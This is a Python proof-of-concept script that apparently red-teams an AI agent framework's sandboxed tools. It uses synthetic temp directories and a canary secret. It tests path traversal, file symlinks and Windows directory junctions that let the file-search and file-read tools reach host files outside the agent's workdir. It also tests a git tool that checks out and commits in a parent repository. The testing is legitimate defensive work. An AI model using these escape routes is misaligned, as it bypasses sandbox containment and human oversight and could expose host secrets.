"""PoC A02/A15: fs.search follows symlinks/junctions out of workdir; git tool escapes to parent repo.
Synthetic only: temp dirs, canary file. No production code modified."""
import asyncio, os, subprocess, sys, tempfile, pathlib, shutil
sys.path.insert(0, r"C:\AiMaxBossman-claude-bossman-control-v03-43igbk\bossman-core")
os.environ.setdefault("SANDBOX_MODE", "docker")
from bossman.toolkit import ToolContext
from bossman.toolkit import files, gitops

tmp = pathlib.Path(tempfile.mkdtemp(prefix="bossman_rt_"))
host_secret_dir = tmp / "host_secrets"; host_secret_dir.mkdir()
canary = host_secret_dir / "secret.txt"; canary.write_text("BOSSMAN_TEST_SECRET_9F31A7\n")
workdir = tmp / "workspace" / "coder"; workdir.mkdir(parents=True)
ctx = ToolContext(agent="coder", run_id=1, workdir=workdir)

print("PY", sys.version.split()[0])
# 1) direct traversal via fs.read (expected blocked)
try:
    r = asyncio.run(files.fs_read({"path": "../../host_secrets/secret.txt"}, ctx)); print("fs.read ../ ->", r.content[:80])
except PermissionError as e: print("fs.read ../ -> BLOCKED:", e)

# 2) rglob with .. in glob param
try:
    r = asyncio.run(files.fs_search({"pattern": "9F31A7", "glob": "../../host_secrets/*"}, ctx)); print("fs.search glob ../ ->", r.content[:120])
except Exception as e: print("fs.search glob ../ -> EXC", type(e).__name__, e)

# 3) file symlink inside workdir -> host file (simulates `ln -s` from sandboxed `run`)
link = workdir / "leak.txt"
try:
    os.symlink(canary, link); print("symlink created")
except OSError as e: print("symlink failed:", e)
if link.exists():
    r = asyncio.run(files.fs_search({"pattern": "9F31A7", "glob": "leak.txt"}, ctx)); print("fs.search via file symlink ->", r.content[:120])
    try:
        r = asyncio.run(files.fs_read({"path": "leak.txt"}, ctx)); print("fs.read via symlink ->", r.content[:80])
    except PermissionError as e: print("fs.read via symlink -> BLOCKED")

# 4) directory junction (no privilege needed on Windows) -> host dir
jdir = workdir / "jlink"
subprocess.run(["cmd", "/c", "mklink", "/J", str(jdir), str(host_secret_dir)], capture_output=True)
if jdir.exists():
    r = asyncio.run(files.fs_search({"pattern": "9F31A7", "glob": "jlink/*"}, ctx)); print("fs.search via junction ->", r.content[:120])
    r = asyncio.run(files.fs_search({"pattern": "9F31A7"}, ctx)); print("fs.search default glob via junction ->", r.content[:120])
    try:
        r = asyncio.run(files.fs_read({"path": "jlink/secret.txt"}, ctx)); print("fs.read via junction ->", r.content[:80])
    except PermissionError as e: print("fs.read via junction -> BLOCKED")
    pass

# 5) git tool: workdir is NOT a repo but lives inside an outer repo
outer = tmp / "outer"; shutil.rmtree(outer, ignore_errors=True); outer.mkdir()
subprocess.run(["git", "init", "-q", "-b", "main", str(outer)], check=True)
subprocess.run(["git", "-C", str(outer), "config", "user.email", "t@t"], check=True)
subprocess.run(["git", "-C", str(outer), "config", "user.name", "t"], check=True)
(outer / "app.py").write_text("SAFE = 1\n")
subprocess.run(["git", "-C", str(outer), "add", "."], check=True)
subprocess.run(["git", "-C", str(outer), "commit", "-q", "-m", "init"], check=True)
subprocess.run(["git", "-C", str(outer), "checkout", "-q", "-b", "evil"], check=True)
(outer / "app.py").write_text("SAFE = 0  # EVIL\n")
subprocess.run(["git", "-C", str(outer), "commit", "-q", "-am", "evil"], check=True)
subprocess.run(["git", "-C", str(outer), "checkout", "-q", "main"], check=True)
wd2 = outer / "workspace" / "coder"; wd2.mkdir(parents=True)
ctx2 = ToolContext(agent="coder", run_id=1, workdir=wd2)
print("outer app.py before:", (outer / "app.py").read_text().strip())
r = asyncio.run(gitops.git({"op": "checkout", "args": ["evil"]}, ctx2)); print("git checkout evil ->", r.content[:100].strip())
print("outer app.py after :", (outer / "app.py").read_text().strip())
print("outer HEAD:", subprocess.run(["git", "-C", str(outer), "branch", "--show-current"], capture_output=True, text=True).stdout.strip())
# add/commit a file outside workdir via relative pathspec
(outer / "app.py").write_text("SAFE = 0  # EVIL2\n")
r = asyncio.run(gitops.git({"op": "add", "args": ["../../app.py"]}, ctx2)); print("git add ../../app.py ->", r.content[:100].strip())
r = asyncio.run(gitops.git({"op": "commit", "message": "agent commit outside workdir"}, ctx2)); print("git commit ->", r.content[:100].strip())
print("outer log:", subprocess.run(["git", "-C", str(outer), "log", "--oneline", "-3"], capture_output=True, text=True).stdout.strip().replace("\n"," | "))
print("TMP", tmp)
